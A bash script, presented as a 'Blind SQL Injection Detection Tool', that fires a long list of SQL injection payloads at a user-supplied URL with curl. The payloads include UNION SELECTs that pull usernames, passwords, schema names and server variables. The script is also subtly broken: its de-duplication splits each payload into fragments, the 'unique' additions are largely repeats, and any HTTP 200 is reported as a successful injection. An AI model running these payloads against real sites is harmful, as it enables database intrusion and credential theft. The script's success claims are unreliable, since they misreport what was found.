#!/bin/bash
# This is a comment

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Function to perform Blind SQL Injection detection
detect_blind_sql_injection() {
    echo -e "${YELLOW}Detecting Blind SQL Injection vulnerabilities...${NC}"
    # Define Blind SQL Injection payloads
    payloads=(
        "' AND SLEEP(5)--"
        "' AND (SELECT COUNT(*) FROM users) = 1 --"
        "' AND '1'='1"
        "' AND '1'='0"
        "' AND 1=1 --"
        "' AND 1=0 --"
        "' OR 1=1 --"
        "' OR 1=0 --"
        "' OR '1'='1"
        "' OR '1'='0"
        "' OR ''='"
        "' OR 'a'='a"
        "' OR 'a'='b"
        "' AND 'a'='a"
        "' AND 'a'='b"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,NULL--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL--"
        "' AND 1=1 UNION ALL SELECT NULL--"
        "' AND 1=1 UNION ALL SELECT 'abc'--"
        "' AND 1=1 UNION ALL SELECT 'abc',NULL--"
        "' AND 1=1 UNION ALL SELECT NULL,'abc'--"
        "' AND 1=1 UNION ALL SELECT 'abc','def'--"
        "' AND 1=1 UNION ALL SELECT table_name FROM information_schema.tables--"
        "' AND 1=1 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
        "' AND 1=1 UNION ALL SELECT username,password FROM users--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,version()--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,database()--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,user()--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,current_user()--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,system_user()--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,session_user()--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,current_database()--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@hostname--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@datadir--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@basedir--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_os--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@tmpdir--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@language--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@lc_time_names--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@global.version_compile_os--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@global.tmpdir--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@global.language--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@global.lc_time_names--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@plugin_dir--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@secure_file_priv--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_comment--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@innodb_version--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_os--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION ALL SELECT NULL,NULL,@@version_compile_machine--"
    )

    # Add 100 additional unique payloads
    additional_payloads=(
        "' AND 1=1 UNION SELECT NULL,NULL,NULL--"
        "' AND 1=1 UNION SELECT NULL,NULL--"
        "' AND 1=1 UNION SELECT NULL--"
        "' AND 1=1 UNION SELECT 'abc'--"
        "' AND 1=1 UNION SELECT 'abc',NULL--"
        "' AND 1=1 UNION SELECT NULL,'abc'--"
        "' AND 1=1 UNION SELECT 'abc','def'--"
        "' AND 1=1 UNION SELECT table_name FROM information_schema.tables--"
        "' AND 1=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
        "' AND 1=1 UNION SELECT username,password FROM users--"
        "' AND 1=1 UNION SELECT NULL,NULL,version()--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version--"
        "' AND 1=1 UNION SELECT NULL,NULL,database()--"
        "' AND 1=1 UNION SELECT NULL,NULL,user()--"
        "' AND 1=1 UNION SELECT NULL,NULL,current_user()--"
        "' AND 1=1 UNION SELECT NULL,NULL,system_user()--"
        "' AND 1=1 UNION SELECT NULL,NULL,session_user()--"
        "' AND 1=1 UNION SELECT NULL,NULL,current_database()--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@hostname--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@datadir--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@basedir--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_os--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@tmpdir--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@language--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@lc_time_names--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@global.version_compile_os--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@global.tmpdir--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@global.language--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@global.lc_time_names--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@plugin_dir--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@secure_file_priv--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_comment--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@innodb_version--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_os--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_machine--"
        "' AND 1=1 UNION SELECT NULL,NULL,@@version_compile_machine--"
    )

    # Combine payloads and additional payloads
    all_payloads=("${payloads[@]}" "${additional_payloads[@]}")

    # Remove duplicate payloads
    unique_payloads=($(echo "${all_payloads[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))

    # Iterate over unique payloads and inject them into vulnerable parameters
    for payload in "${unique_payloads[@]}"; do
        echo -e "${YELLOW}Testing payload: $payload${NC}"
        response=$(curl -s -o /dev/null -w "%{http_code}" -d "username=admin&password=$payload" -X POST "$1")
        if [ "$response" == "200" ]; then
            echo -e "${GREEN}Payload $payload executed successfully. Response code: $response${NC}"
        else
            echo -e "${RED}Payload $payload failed. Response code: $response${NC}"
        fi
        echo -e "${YELLOW}URL with payload: $1?username=admin&password=$payload${NC}"
    done
}

# Main function
main() {
    echo -e "${GREEN}Blind SQL Injection Detection Tool${NC}"
    echo -e "${GREEN}----------------------------------${NC}"

    # Prompt user for target URL
    read -p "$(echo -e ${GREEN}'Enter the target URL: '${NC})" target_url

    # Validate input
    if [ -z "$target_url" ]; then
        echo -e "${RED}Target URL cannot be empty${NC}"
        exit 1
    fi

    # Perform Blind SQL Injection detection
    detect_blind_sql_injection "$target_url"
}

# Call main function
main
